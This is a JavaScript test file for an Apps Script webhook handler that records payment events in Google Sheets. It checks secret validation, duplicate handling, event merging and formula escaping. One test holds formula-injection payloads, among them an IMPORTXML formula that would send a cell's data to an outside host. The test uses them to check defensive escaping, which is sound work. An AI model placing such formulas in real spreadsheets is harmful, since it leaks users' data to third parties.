// Runs apps-script/Code.gs in a VM against fake Google services.
import { test, beforeEach } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import vm from 'node:vm';

const code = readFileSync(new URL('../apps-script/Code.gs', import.meta.url), 'utf8');

const TAGS = { lead_id: 'L1', lp_name: 'home', utm_source: 'fb', utm_campaign: 'diwali' };

const FORM = {
  data: {
    form: { form_id: 'f1', form_url: 'u', form_currency: 'INR' },
    order: {
      order_amount: 3999, order_id: 'CFPay_1', order_status: 'PAID', transaction_id: 99,
      customer_details: { customer_phone: '9999999999', customer_email: 'a@b.co', customer_name: 'A B', customer_fields: [] },
      amount_details: [],
    },
  },
  event_time: 't',
  type: 'PAYMENT_FORM_ORDER_WEBHOOK',
};

const pg = (type, payment_status, order = {}) => ({
  data: {
    order: { order_id: 'CFPay_1', order_amount: 3999, order_currency: 'INR', order_tags: TAGS, ...order },
    payment: { cf_payment_id: 99, payment_status, payment_amount: 3999, payment_currency: 'INR', payment_group: 'upi',
      ...(payment_status === 'FAILED' && { error_details: { error_description: 'bank declined' } }) },
    customer_details: { customer_name: 'A B', customer_email: 'a@b.co', customer_phone: '9999999999' },
  },
  event_time: 't',
  type,
});

function fakeSheet() {
  const rows = [];
  return {
    rows,
    appendRow: (r) => rows.push([...r]),
    setFrozenRows() {},
    getLastRow: () => rows.length,
    getRange: (row, col, n = 1, m = 1) => ({
      createTextFinder: (text) => ({
        matchEntireCell: () => ({
          findNext: () => {
            const i = rows.slice(row - 1, row - 1 + n).findIndex((r) => r[col - 1] === text);
            return i === -1 ? null : { getRow: () => row + i };
          },
        }),
      }),
      getValues: () => rows.slice(row - 1, row - 1 + n).map((r) => r.slice(col - 1, col - 1 + m)),
      setValues: (vals) => vals.forEach((v, i) => rows[row - 1 + i].splice(col - 1, m, ...v)),
    }),
  };
}

let ctx, sheets, lockEvents;
beforeEach(() => {
  sheets = {};
  lockEvents = [];
  ctx = vm.createContext({
    LockService: { getScriptLock: () => ({ waitLock: () => lockEvents.push('wait'), releaseLock: () => lockEvents.push('release') }) },
    PropertiesService: { getScriptProperties: () => ({ getProperty: (k) => ({ SHARED_SECRET: 'shh' })[k] }) },
    SpreadsheetApp: {
      getActiveSpreadsheet: () => ({
        getSheetByName: (n) => sheets[n] || null,
        insertSheet: (n) => (sheets[n] = fakeSheet()),
      }),
    },
    ContentService: {
      MimeType: { JSON: 'json' },
      createTextOutput: (s) => ({ text: s, setMimeType() { return this; } }),
    },
    JSON, String, Date,
  });
  vm.runInContext(code, ctx);
});

const post = (obj) => JSON.parse(ctx.doPost({ postData: { contents: JSON.stringify(obj) } }).text);
const hook = (payload = FORM, secret = 'shh') => post({ secret, raw: JSON.stringify(payload), received_at: 'now' });
const payments = () => {
  const [headers, ...rows] = sheets.Payments.rows;
  return rows.map((r) => Object.fromEntries(headers.map((h, i) => [h, r[i]])));
};

test('rejects a wrong secret and writes nothing', () => {
  assert.equal(hook(FORM, 'bad').ok, false);
  assert.deepEqual(Object.keys(sheets), []);
});

test('form webhook: raw + parsed row, phone as text', () => {
  assert.deepEqual(hook(), { ok: true, stored: 'payment' });
  assert.equal(sheets.Payments_Raw.rows.length, 2); // header + 1
  const [p] = payments();
  assert.equal(p.order_id, 'CFPay_1');
  assert.equal(p.status, 'PAID');
  assert.equal(p.phone, "'9999999999");
  assert.equal(p.form_id, 'f1');
});

test('form webhook with order_tags fills the tag columns', () => {
  const tagged = structuredClone(FORM);
  tagged.data.order.order_tags = TAGS;
  hook(tagged);
  const [p] = payments();
  assert.equal(p.lead_id, 'L1');
  assert.equal(p.lp_name, 'home');
  assert.equal(p.utm_source, 'fb');
  assert.equal(p.gclid, '');
});

test('same delivery twice -> one payment row, two raw rows', () => {
  hook();
  assert.equal(hook().stored, 'duplicate');
  assert.equal(payments().length, 1);
  assert.equal(sheets.Payments_Raw.rows.length, 3);
});

test('PG success after form PAID merges into one row and adds the tags', () => {
  hook(); // form webhook, no tags
  assert.equal(hook(pg('PAYMENT_SUCCESS_WEBHOOK', 'SUCCESS')).stored, 'merged');
  const rows = payments();
  assert.equal(rows.length, 1);
  assert.equal(rows[0].event_type, 'PAYMENT_FORM_ORDER_WEBHOOK'); // first writer kept
  assert.equal(rows[0].lead_id, 'L1');
  assert.equal(rows[0].payment_method, 'upi');
});

test('failed and dropped attempts are their own rows, with the error', () => {
  hook(pg('PAYMENT_FAILED_WEBHOOK', 'FAILED'));
  hook(pg('PAYMENT_USER_DROPPED_WEBHOOK', 'USER_DROPPED'));
  hook(pg('PAYMENT_SUCCESS_WEBHOOK', 'SUCCESS'));
  const rows = payments();
  assert.deepEqual(rows.map((r) => r.status), ['FAILED', 'USER_DROPPED', 'PAID']);
  assert.equal(rows[0].error, 'bank declined');
});

test('PG events for non-landing-page orders are kept raw only', () => {
  const appOrder = pg('PAYMENT_SUCCESS_WEBHOOK', 'SUCCESS', { order_id: 'app_123', order_tags: null });
  assert.equal(hook(appOrder).stored, 'raw_only');
  assert.equal(sheets.Payments, undefined);
  assert.equal(sheets.Payments_Raw.rows.length, 2);
});

test('PG event with our tags but a non-CFPay id is kept', () => {
  assert.equal(hook(pg('PAYMENT_SUCCESS_WEBHOOK', 'SUCCESS', { order_id: 'x_1' })).stored, 'payment');
});

test('customer text that looks like a formula is stored as plain text', () => {
  const evil = structuredClone(FORM);
  evil.data.order.customer_details.customer_name = '=IMPORTXML("https://x.co/?"&A1,"//a")';
  evil.data.order.customer_details.customer_email = '+cmd@x.co';
  evil.data.order.customer_details.customer_phone = '+919999999999';
  evil.data.order.order_tags = { lead_id: '=HYPERLINK("x")' };
  hook(evil);
  const [p] = payments();
  assert.equal(p.name, '\'=IMPORTXML("https://x.co/?"&A1,"//a")');
  assert.equal(p.email, "'+cmd@x.co");
  assert.equal(p.phone, "'+919999999999");
  assert.equal(p.lead_id, '\'=HYPERLINK("x")');
});

test('unknown event type is kept raw only', () => {
  assert.equal(hook({ type: 'PAYMENT_CHARGES_WEBHOOK', data: { order: { order_id: 'CFPay_1' } } }).stored, 'raw_only');
  assert.equal(sheets.Payments, undefined);
});

test('malformed body returns ok:false and still releases the lock', () => {
  const r = JSON.parse(ctx.doPost({ postData: { contents: 'not json' } }).text);
  assert.equal(r.ok, false);
  assert.equal(lockEvents.at(-1), 'release');
});
